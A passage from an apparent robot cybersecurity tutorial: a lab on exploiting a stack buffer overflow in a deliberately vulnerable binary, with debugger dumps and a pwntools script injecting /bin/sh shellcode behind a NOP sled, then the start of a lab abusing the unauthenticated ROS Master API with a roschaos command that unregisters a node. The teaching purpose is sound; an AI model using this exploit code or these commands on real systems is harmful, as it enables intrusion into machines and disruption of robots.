    <p>We’ve breaked after the read which should get us all the stuff from the script. Now, let’s inspect a bit the stack memory:</p>
    <div class="sourceCode" id="cb251"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb251-1"><a href="#cb251-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Terminal 2</span></span>
    <span id="cb251-2"><a href="#cb251-2" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> stack 100</span>
    <span id="cb251-3"><a href="#cb251-3" aria-hidden="true" tabindex="-1"></a><span class="ex">00:0000│</span> esp  0xff8094d0 —▸ 0x80ef200 <span class="er">(</span><span class="ex">_IO_2_1_stdout_</span><span class="kw">)</span> <span class="ex">◂—</span> 0xfbad2887</span>
    <span id="cb251-4"><a href="#cb251-4" aria-hidden="true" tabindex="-1"></a><span class="ex">01:0004│</span>      0xff8094d4 —▸ 0x80bee20 ◂— push   esp</span>
    <span id="cb251-5"><a href="#cb251-5" aria-hidden="true" tabindex="-1"></a><span class="ex">02:0008│</span> ecx  0xff8094d8 ◂— 0x41414141 <span class="er">(</span><span class="st">&#39;AAAA&#39;</span><span class="kw">)</span></span>
    <span id="cb251-6"><a href="#cb251-6" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> ↓</span>
    <span id="cb251-7"><a href="#cb251-7" aria-hidden="true" tabindex="-1"></a><span class="ex">27:009c│</span>      0xff80956c ◂— 0xdeadc0de</span>
    <span id="cb251-8"><a href="#cb251-8" aria-hidden="true" tabindex="-1"></a><span class="ex">28:00a0│</span>      0xff809570 ◂— 0x0</span>
    <span id="cb251-9"><a href="#cb251-9" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> ↓</span></code></pre></div>
    <p>Analyzing the registers:</p>
    <div class="sourceCode" id="cb252"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb252-1"><a href="#cb252-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> regs</span>
    <span id="cb252-2"><a href="#cb252-2" aria-hidden="true" tabindex="-1"></a><span class="ex">*EAX</span>  0x3e8</span>
    <span id="cb252-3"><a href="#cb252-3" aria-hidden="true" tabindex="-1"></a><span class="ex">*EBX</span>  0x80481b0 <span class="er">(</span><span class="ex">_init</span><span class="kw">)</span> <span class="ex">◂—</span> push   ebx</span>
    <span id="cb252-4"><a href="#cb252-4" aria-hidden="true" tabindex="-1"></a> <span class="ex">ECX</span>  0xff8094d8 ◂— 0x41414141 <span class="er">(</span><span class="st">&#39;AAAA&#39;</span><span class="kw">)</span></span>
    <span id="cb252-5"><a href="#cb252-5" aria-hidden="true" tabindex="-1"></a> <span class="ex">EDX</span>  0x400</span>
    <span id="cb252-6"><a href="#cb252-6" aria-hidden="true" tabindex="-1"></a> <span class="ex">EDI</span>  0x4e</span>
    <span id="cb252-7"><a href="#cb252-7" aria-hidden="true" tabindex="-1"></a> <span class="ex">ESI</span>  0x80ef00c <span class="er">(</span><span class="ex">_GLOBAL_OFFSET_TABLE_+12</span><span class="kw">)</span> <span class="ex">—▸</span> 0x8069d70 <span class="er">(</span><span class="ex">__strcpy_sse2</span><span class="kw">)</span> <span class="ex">◂—</span> mov    edx, dword ptr [esp + 4]</span>
    <span id="cb252-8"><a href="#cb252-8" aria-hidden="true" tabindex="-1"></a> <span class="ex">EBP</span>  0xff809568 ◂— 0x41414141 <span class="er">(</span><span class="st">&#39;AAAA&#39;</span><span class="kw">)</span></span>
    <span id="cb252-9"><a href="#cb252-9" aria-hidden="true" tabindex="-1"></a><span class="ex">*ESP</span>  0xff8094d0 —▸ 0x80ef200 <span class="er">(</span><span class="ex">_IO_2_1_stdout_</span><span class="kw">)</span> <span class="ex">◂—</span> 0xfbad2887</span>
    <span id="cb252-10"><a href="#cb252-10" aria-hidden="true" tabindex="-1"></a><span class="ex">*EIP</span>  0x80488d5 <span class="er">(</span><span class="ex">vuln+57</span><span class="kw">)</span> <span class="ex">◂—</span> sub    esp, 8</span></code></pre></div>
    <p>We can see that EBP points out to <code>0xff809568</code>, which means that the return <code>ret</code> address points to <code>0xff80956c</code>. According to the memory dump above, it contains <code>0xdeadc0de</code> which we introduced as desired.</p>
    <p>Thereby, we took control of the EIP.</p>
    <h4 id="trying-to-execute-a-shellcode">Trying to execute a shellcode</h4>
    <p>Let’s compile the program without NX protection:</p>
    <div class="sourceCode" id="cb253"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb253-1"><a href="#cb253-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> <span class="at">-m32</span> <span class="at">-g</span> <span class="at">-fno-stack-protector</span> <span class="at">-z</span> execstack <span class="at">-static</span> <span class="at">-o</span> ./build/1_nx ./src/1_static.c</span></code></pre></div>
    <p>Which we can verify as:</p>
    <div class="sourceCode" id="cb254"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb254-1"><a href="#cb254-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9d3c62865471:~/tutorial#</span> checksec build/1_static</span>
    <span id="cb254-2"><a href="#cb254-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/root/tutorial/build/1_static&#39;</span></span>
    <span id="cb254-3"><a href="#cb254-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>     i386-32-little</span>
    <span id="cb254-4"><a href="#cb254-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>    Partial RELRO</span>
    <span id="cb254-5"><a href="#cb254-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>    No canary found</span>
    <span id="cb254-6"><a href="#cb254-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>       NX disabled</span>
    <span id="cb254-7"><a href="#cb254-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>      No PIE <span class="er">(</span><span class="ex">0x8048000</span><span class="kw">)</span></span>
    <span id="cb254-8"><a href="#cb254-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RWX:</span>      Has RWX segments</span>
    <span id="cb254-9"><a href="#cb254-9" aria-hidden="true" tabindex="-1"></a><span class="ex">root@9d3c62865471:~/tutorial#</span> checksec build/1_staticnx</span>
    <span id="cb254-10"><a href="#cb254-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/root/tutorial/build/1_staticnx&#39;</span></span>
    <span id="cb254-11"><a href="#cb254-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>     i386-32-little</span>
    <span id="cb254-12"><a href="#cb254-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>    Partial RELRO</span>
    <span id="cb254-13"><a href="#cb254-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>    No canary found</span>
    <span id="cb254-14"><a href="#cb254-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>       NX enabled</span>
    <span id="cb254-15"><a href="#cb254-15" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>      No PIE <span class="er">(</span><span class="ex">0x8048000</span><span class="kw">)</span></span></code></pre></div>
    <p>Now, we simply overflow it making sure we append and prepend Noops to the shellcode. We use following script (<code>1_skeleton_shellcode.py</code>):</p>
    <div class="sourceCode" id="cb255"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb255-1"><a href="#cb255-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
    <span id="cb255-2"><a href="#cb255-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb255-3"><a href="#cb255-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Define the context of the working machine</span></span>
    <span id="cb255-4"><a href="#cb255-4" aria-hidden="true" tabindex="-1"></a>context(arch<span class="op">=</span><span class="st">&#39;i386&#39;</span>, os<span class="op">=</span><span class="st">&#39;linux&#39;</span>)</span>
    <span id="cb255-5"><a href="#cb255-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb255-6"><a href="#cb255-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> main():</span>
    <span id="cb255-7"><a href="#cb255-7" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Start the process</span></span>
    <span id="cb255-8"><a href="#cb255-8" aria-hidden="true" tabindex="-1"></a>    log.info(<span class="st">&quot;Launching the process&quot;</span>)</span>
    <span id="cb255-9"><a href="#cb255-9" aria-hidden="true" tabindex="-1"></a>    p <span class="op">=</span> process(<span class="st">&quot;../build/1_static&quot;</span>)</span>
    <span id="cb255-10"><a href="#cb255-10" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb255-11"><a href="#cb255-11" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Get a simple shellcode</span></span>
    <span id="cb255-12"><a href="#cb255-12" aria-hidden="true" tabindex="-1"></a>    log.info(<span class="st">&quot;Putting together simple shellcode&quot;</span>)</span>
    <span id="cb255-13"><a href="#cb255-13" aria-hidden="true" tabindex="-1"></a>    shellcode <span class="op">=</span> asm(shellcraft.sh())</span>
    <span id="cb255-14"><a href="#cb255-14" aria-hidden="true" tabindex="-1"></a>    <span class="co"># print(len(shellcode))</span></span>
    <span id="cb255-15"><a href="#cb255-15" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(asm(shellcraft.sh()))</span>
    <span id="cb255-16"><a href="#cb255-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb255-17"><a href="#cb255-17" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Craft the payload</span></span>
    <span id="cb255-18"><a href="#cb255-18" aria-hidden="true" tabindex="-1"></a>    log.info(<span class="st">&quot;Crafting the payload&quot;</span>)</span>
    <span id="cb255-19"><a href="#cb255-19" aria-hidden="true" tabindex="-1"></a>    <span class="co"># payload = &quot;A&quot;*148</span></span>
    <span id="cb255-20"><a href="#cb255-20" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> <span class="st">&quot;</span><span class="ch">\x90</span><span class="st">&quot;</span><span class="op">*</span><span class="dv">86</span>    <span class="co"># no op code</span></span>
    <span id="cb255-21"><a href="#cb255-21" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> shellcode   <span class="co"># 44 chars</span></span>
    <span id="cb255-22"><a href="#cb255-22" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> <span class="st">&quot;</span><span class="ch">\x90</span><span class="st">&quot;</span><span class="op">*</span><span class="dv">18</span>    <span class="co"># no op code</span></span>
    <span id="cb255-23"><a href="#cb255-23" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> p32(<span class="bn">0xdeadc0de</span>)</span>
    <span id="cb255-24"><a href="#cb255-24" aria-hidden="true" tabindex="-1"></a>    <span class="co"># payload += &quot;\x90&quot;*500    # no op code</span></span>
    <span id="cb255-25"><a href="#cb255-25" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> payload.ljust(<span class="dv">2000</span>, <span class="st">&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span>)</span>
    <span id="cb255-26"><a href="#cb255-26" aria-hidden="true" tabindex="-1"></a>    <span class="co"># log.info(payload)</span></span>
    <span id="cb255-27"><a href="#cb255-27" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb255-28"><a href="#cb255-28" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Print the process id</span></span>
    <span id="cb255-29"><a href="#cb255-29" aria-hidden="true" tabindex="-1"></a>    <span class="bu">raw_input</span>(<span class="bu">str</span>(p.proc.pid))</span>
    <span id="cb255-30"><a href="#cb255-30" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb255-31"><a href="#cb255-31" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Send the payload</span></span>
    <span id="cb255-32"><a href="#cb255-32" aria-hidden="true" tabindex="-1"></a>    p.send(payload)</span>
    <span id="cb255-33"><a href="#cb255-33" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb255-34"><a href="#cb255-34" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Transfer interaction to the user</span></span>
    <span id="cb255-35"><a href="#cb255-35" aria-hidden="true" tabindex="-1"></a>    p.interactive()</span>
    <span id="cb255-36"><a href="#cb255-36" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb255-37"><a href="#cb255-37" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
    <span id="cb255-38"><a href="#cb255-38" aria-hidden="true" tabindex="-1"></a>    main()</span></code></pre></div>
    <p>which gets us a situation like:</p>
    <div class="sourceCode" id="cb256"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb256-1"><a href="#cb256-1" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> SOURCE <span class="er">(</span>CODE<span class="er">)</span> <span class="bu">]</span></span>
    <span id="cb256-2"><a href="#cb256-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">9</span>     char <span class="pp">*</span> second_buffer<span class="kw">;</span></span>
    <span id="cb256-3"><a href="#cb256-3" aria-hidden="true" tabindex="-1"></a>   <span class="ex">10</span>     uint32_t length = 0<span class="kw">;</span></span>
    <span id="cb256-4"><a href="#cb256-4" aria-hidden="true" tabindex="-1"></a>   <span class="ex">11</span>     puts<span class="er">(</span><span class="st">&quot;Reading from STDIN&quot;</span><span class="kw">);</span></span>
    <span id="cb256-5"><a href="#cb256-5" aria-hidden="true" tabindex="-1"></a>   <span class="ex">12</span>     read<span class="er">(</span><span class="ex">0,</span> buffer, 1024<span class="kw">);</span></span>
    <span id="cb256-6"><a href="#cb256-6" aria-hidden="true" tabindex="-1"></a>   <span class="ex">13</span></span>
    <span id="cb256-7"><a href="#cb256-7" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> 14     if <span class="er">(</span><span class="ex">strcmp</span><span class="er">(</span><span class="ex">buffer,</span> <span class="st">&quot;Cool Input&quot;</span><span class="kw">)</span> <span class="ex">==</span> 0<span class="kw">)</span> <span class="kw">{</span></span>
    <span id="cb256-8"><a href="#cb256-8" aria-hidden="true" tabindex="-1"></a>   <span class="ex">15</span>         puts<span class="er">(</span><span class="st">&quot;What a cool string.&quot;</span><span class="kw">);</span></span>
    <span id="cb256-9"><a href="#cb256-9" aria-hidden="true" tabindex="-1"></a>   <span class="ex">16</span>     }</span>
    <span id="cb256-10"><a href="#cb256-10" aria-hidden="true" tabindex="-1"></a>   <span class="ex">17</span>     length = strlen<span class="er">(</span><span class="ex">buffer</span><span class="kw">);</span></span>
    <span id="cb256-11"><a href="#cb256-11" aria-hidden="true" tabindex="-1"></a>   <span class="ex">18</span>     if <span class="er">(</span><span class="ex">length</span> == 42<span class="kw">)</span> <span class="kw">{</span></span>
    <span id="cb256-12"><a href="#cb256-12" aria-hidden="true" tabindex="-1"></a>   <span class="ex">19</span>         puts<span class="er">(</span><span class="st">&quot;LUE&quot;</span><span class="kw">);</span></span>
    <span id="cb256-13"><a href="#cb256-13" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> STACK <span class="bu">]</span></span>
    <span id="cb256-14"><a href="#cb256-14" aria-hidden="true" tabindex="-1"></a><span class="ex">00:0000│</span> esp  0xff9abbe0 —▸ 0x80ef200 <span class="er">(</span><span class="ex">_IO_2_1_stdout_</span><span class="kw">)</span> <span class="ex">◂—</span> xchg   dword ptr [eax], ebp /<span class="pp">*</span> 0xfbad2887 <span class="pp">*</span>/</span>
    <span id="cb256-15"><a href="#cb256-15" aria-hidden="true" tabindex="-1"></a><span class="ex">01:0004│</span>      0xff9abbe4 —▸ 0x80bee20 ◂— push   esp</span>
    <span id="cb256-16"><a href="#cb256-16" aria-hidden="true" tabindex="-1"></a><span class="ex">02:0008│</span> ecx  0xff9abbe8 ◂— 0x90909090</span>
    <span id="cb256-17"><a href="#cb256-17" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> ↓</span>
    <span id="cb256-18"><a href="#cb256-18" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> BACKTRACE <span class="bu">]</span></span>
    <span id="cb256-19"><a href="#cb256-19" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> f 0  80488d5 vuln+57</span>
    <span id="cb256-20"><a href="#cb256-20" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 1 deadc0de</span>
    <span id="cb256-21"><a href="#cb256-21" aria-hidden="true" tabindex="-1"></a>   <span class="ex">f</span> 2        0</span>
    <span id="cb256-22"><a href="#cb256-22" aria-hidden="true" tabindex="-1"></a><span class="ex">Breakpoint</span> /root/tutorial/src/1_staticnx.c:14</span>
    <span id="cb256-23"><a href="#cb256-23" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> stack 50</span>
    <span id="cb256-24"><a href="#cb256-24" aria-hidden="true" tabindex="-1"></a><span class="ex">00:0000│</span> esp  0xff9abbe0 —▸ 0x80ef200 <span class="er">(</span><span class="ex">_IO_2_1_stdout_</span><span class="kw">)</span> <span class="ex">◂—</span> xchg   dword ptr [eax], ebp /<span class="pp">*</span> 0xfbad2887 <span class="pp">*</span>/</span>
    <span id="cb256-25"><a href="#cb256-25" aria-hidden="true" tabindex="-1"></a><span class="ex">01:0004│</span>      0xff9abbe4 —▸ 0x80bee20 ◂— push   esp</span>
    <span id="cb256-26"><a href="#cb256-26" aria-hidden="true" tabindex="-1"></a><span class="ex">02:0008│</span> ecx  0xff9abbe8 ◂— 0x90909090</span>
    <span id="cb256-27"><a href="#cb256-27" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> ↓</span>
    <span id="cb256-28"><a href="#cb256-28" aria-hidden="true" tabindex="-1"></a><span class="ex">17:005c│</span>      0xff9abc3c ◂— 0x686a9090</span>
    <span id="cb256-29"><a href="#cb256-29" aria-hidden="true" tabindex="-1"></a><span class="ex">18:0060│</span>      0xff9abc40 ◂— 0x2f2f2f68 <span class="er">(</span><span class="st">&#39;h///&#39;</span><span class="kw">)</span></span>
    <span id="cb256-30"><a href="#cb256-30" aria-hidden="true" tabindex="-1"></a><span class="ex">19:0064│</span>      0xff9abc44 ◂— 0x622f6873 <span class="er">(</span><span class="st">&#39;sh/b&#39;</span><span class="kw">)</span></span>
    <span id="cb256-31"><a href="#cb256-31" aria-hidden="true" tabindex="-1"></a><span class="ex">1a:0068│</span>      0xff9abc48 ◂— 0xe3896e69</span>
    <span id="cb256-32"><a href="#cb256-32" aria-hidden="true" tabindex="-1"></a><span class="ex">1b:006c│</span>      0xff9abc4c ◂— 0x1010168</span>
    <span id="cb256-33"><a href="#cb256-33" aria-hidden="true" tabindex="-1"></a><span class="ex">1c:0070│</span>      0xff9abc50 ◂— 0x24348101</span>
    <span id="cb256-34"><a href="#cb256-34" aria-hidden="true" tabindex="-1"></a><span class="ex">1d:0074│</span>      0xff9abc54 ◂— 0x1016972</span>
    <span id="cb256-35"><a href="#cb256-35" aria-hidden="true" tabindex="-1"></a><span class="ex">1e:0078│</span>      0xff9abc58 ◂— 0x6a51c931</span>
    <span id="cb256-36"><a href="#cb256-36" aria-hidden="true" tabindex="-1"></a><span class="ex">1f:007c│</span>      0xff9abc5c ◂— 0xe1015904</span>
    <span id="cb256-37"><a href="#cb256-37" aria-hidden="true" tabindex="-1"></a><span class="ex">20:0080│</span>      0xff9abc60 ◂— 0x31e18951</span>
    <span id="cb256-38"><a href="#cb256-38" aria-hidden="true" tabindex="-1"></a><span class="ex">21:0084│</span>      0xff9abc64 ◂— 0x580b6ad2</span>
    <span id="cb256-39"><a href="#cb256-39" aria-hidden="true" tabindex="-1"></a><span class="ex">22:0088│</span>      0xff9abc68 ◂— 0x909080cd</span>
    <span id="cb256-40"><a href="#cb256-40" aria-hidden="true" tabindex="-1"></a><span class="ex">23:008c│</span>      0xff9abc6c ◂— 0x90909090</span>
    <span id="cb256-41"><a href="#cb256-41" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> ↓</span>
    <span id="cb256-42"><a href="#cb256-42" aria-hidden="true" tabindex="-1"></a><span class="ex">27:009c│</span>      0xff9abc7c ◂— 0xdeadc0de</span>
    <span id="cb256-43"><a href="#cb256-43" aria-hidden="true" tabindex="-1"></a><span class="ex">28:00a0│</span>      0xff9abc80 ◂— 0x0</span>
    <span id="cb256-44"><a href="#cb256-44" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> ↓</span>
    <span id="cb256-45"><a href="#cb256-45" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> regs</span>
    <span id="cb256-46"><a href="#cb256-46" aria-hidden="true" tabindex="-1"></a><span class="ex">*EAX</span>  0x400</span>
    <span id="cb256-47"><a href="#cb256-47" aria-hidden="true" tabindex="-1"></a><span class="ex">*EBX</span>  0x80481b0 <span class="er">(</span><span class="ex">_init</span><span class="kw">)</span> <span class="ex">◂—</span> push   ebx</span>
    <span id="cb256-48"><a href="#cb256-48" aria-hidden="true" tabindex="-1"></a> <span class="ex">ECX</span>  0xff9abbe8 ◂— 0x90909090</span>
    <span id="cb256-49"><a href="#cb256-49" aria-hidden="true" tabindex="-1"></a> <span class="ex">EDX</span>  0x400</span>
    <span id="cb256-50"><a href="#cb256-50" aria-hidden="true" tabindex="-1"></a> <span class="ex">EDI</span>  0x4e</span>
    <span id="cb256-51"><a href="#cb256-51" aria-hidden="true" tabindex="-1"></a> <span class="ex">ESI</span>  0x80ef00c <span class="er">(</span><span class="ex">_GLOBAL_OFFSET_TABLE_+12</span><span class="kw">)</span> <span class="ex">—▸</span> 0x8069d70 <span class="er">(</span><span class="ex">__strcpy_sse2</span><span class="kw">)</span> <span class="ex">◂—</span> mov    edx, dword ptr [esp + 4]</span>
    <span id="cb256-52"><a href="#cb256-52" aria-hidden="true" tabindex="-1"></a> <span class="ex">EBP</span>  0xff9abc78 ◂— 0x90909090</span>
    <span id="cb256-53"><a href="#cb256-53" aria-hidden="true" tabindex="-1"></a><span class="ex">*ESP</span>  0xff9abbe0 —▸ 0x80ef200 <span class="er">(</span><span class="ex">_IO_2_1_stdout_</span><span class="kw">)</span> <span class="ex">◂—</span> xchg   dword ptr [eax], ebp /<span class="pp">*</span> 0xfbad2887 <span class="pp">*</span>/</span>
    <span id="cb256-54"><a href="#cb256-54" aria-hidden="true" tabindex="-1"></a><span class="ex">*EIP</span>  0x80488d5 <span class="er">(</span><span class="ex">vuln+57</span><span class="kw">)</span> <span class="ex">◂—</span> sub    esp, 8</span></code></pre></div>
    <p>Problem now is how to modify <code>0xdeadc0de</code> by something that falls on the Noop section</p>
    <h4 id="code-gadgets">Code Gadgets</h4>
    <p>TODO</p>
    <h3 id="resources-17">Resources</h3>
    <ul>
    <li>[1] Linux exploitation course. Retrieved from https://github.com/nnamon/linux-exploitation-course.</li>
    <li>[2] Bypassing NX with Return Oriented Programming. Retrieved from https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/6_bypass_nx_rop/lessonplan.md.</li>
    <li>[3] pwndebug. Retrieved from https://github.com/pwndbg/pwndbg.</li>
    <li>[4] Why do we have to put the shellcode before the return address in the buffer overflow? Retreived from https://security.stackexchange.com/questions/101222/why-do-we-have-to-put-the-shellcode-before-the-return-address-in-the-buffer-over?rq=1.</li>
    </ul>
    <h2 id="unauthenticated-registrationunregistration-with-ros-master-api">Unauthenticated registration/unregistration with ROS Master API</h2>
    <p>In this tutorial we’ll review how the <a href="http://wiki.ros.org/ROS/Master_API#register.2BAC8-unregister_methods">ROS Master API</a> requires no authentication capabilities to register and unregister publishers, subscribers and services. This leads to a [reported vulnerability] (https://github.com/aliasrobotics/RVDP/issues/87) that can easily be exploited with off-the-shelf penetration testing tools by an attacker with access to the internal robot network.</p>
    <p>This work is heavily based on [1],[3] and [4].</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb257"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb257-1"><a href="#cb257-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity11:latest .</span></code></pre></div>
    <p>and run with:</p>
    <div class="sourceCode" id="cb258"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb258-1"><a href="#cb258-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> basic_cybersecurity11:latest</span></code></pre></div>
    <hr />
    <p>Let’s start by listing the ROS Nodes and Topics participating in the network. After launching the container:</p>
    <div class="sourceCode" id="cb259"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb259-1"><a href="#cb259-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rosrun scenario1 talker <span class="kw">&amp;</span></span>
    <span id="cb259-2"><a href="#cb259-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rosrun scenario1 listener</span></code></pre></div>
    <p>Now, let’s get a second command line into the simulated robotic scenario running over docker. To do so:</p>
    <div class="sourceCode" id="cb260"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb260-1"><a href="#cb260-1" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">=</span><span class="op">&gt;</span> docker ps</span>
    <span id="cb260-2"><a href="#cb260-2" aria-hidden="true" tabindex="-1"></a><span class="ex">CONTAINER</span> ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS               NAMES</span>
    <span id="cb260-3"><a href="#cb260-3" aria-hidden="true" tabindex="-1"></a><span class="ex">935c390c1e49</span>        basic_cybersecurity11:latest   <span class="st">&quot;/root/launch_script…&quot;</span>   20 seconds ago      Up 19 seconds                           vibrant_chandrasekhar</span>
    <span id="cb260-4"><a href="#cb260-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb260-5"><a href="#cb260-5" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">=</span><span class="op">&gt;</span> docker exec <span class="at">-it</span> 935c390c1e49 /bin/bash</span>
    <span id="cb260-6"><a href="#cb260-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@935c390c1e49:/#</span></span></code></pre></div>
    <p>On the second terminal of the same docker instance:</p>
    <div class="sourceCode" id="cb261"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb261-1"><a href="#cb261-1" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb261-2"><a href="#cb261-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rosnode list</span>
    <span id="cb261-3"><a href="#cb261-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/listener</span></span>
    <span id="cb261-4"><a href="#cb261-4" aria-hidden="true" tabindex="-1"></a><span class="ex">/publisher</span></span>
    <span id="cb261-5"><a href="#cb261-5" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout</span></span>
    <span id="cb261-6"><a href="#cb261-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rostopic list</span>
    <span id="cb261-7"><a href="#cb261-7" aria-hidden="true" tabindex="-1"></a><span class="ex">/flag</span></span>
    <span id="cb261-8"><a href="#cb261-8" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout</span></span>
    <span id="cb261-9"><a href="#cb261-9" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout_agg</span></span></code></pre></div>
    <p>We can see that there’re several Nodes, we’re mainly interested on <code>/publisher</code> and <code>/listener</code>. Both, exchanging information through the <code>/flag</code> Topic as follows:</p>
    <div class="sourceCode" id="cb262"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb262-1"><a href="#cb262-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rostopic echo /flag</span>
    <span id="cb262-2"><a href="#cb262-2" aria-hidden="true" tabindex="-1"></a><span class="ex">data:</span> <span class="st">&quot;br{N(*-E6NgwbyWc&quot;</span></span>
    <span id="cb262-3"><a href="#cb262-3" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
    <span id="cb262-4"><a href="#cb262-4" aria-hidden="true" tabindex="-1"></a><span class="ex">data:</span> <span class="st">&quot;br{N(*-E6NgwbyWc&quot;</span></span>
    <span id="cb262-5"><a href="#cb262-5" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
    <span id="cb262-6"><a href="#cb262-6" aria-hidden="true" tabindex="-1"></a><span class="ex">data:</span> <span class="st">&quot;br{N(*-E6NgwbyWc&quot;</span></span>
    <span id="cb262-7"><a href="#cb262-7" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
    <span id="cb262-8"><a href="#cb262-8" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
    <h3 id="unregistering-publisher-from-listener">Unregistering <code>/publisher</code> from <code>/listener</code></h3>
    <div class="sourceCode" id="cb263"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb263-1"><a href="#cb263-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@655447dc534c:/#</span> rosnode list</span>
    <span id="cb263-2"><a href="#cb263-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/listener</span></span>
    <span id="cb263-3"><a href="#cb263-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/publisher</span></span>
    <span id="cb263-4"><a href="#cb263-4" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout</span></span>
    <span id="cb263-5"><a href="#cb263-5" aria-hidden="true" tabindex="-1"></a><span class="ex">root@655447dc534c:/#</span> roschaos master unregister node <span class="at">--node_name</span> /publisher</span>
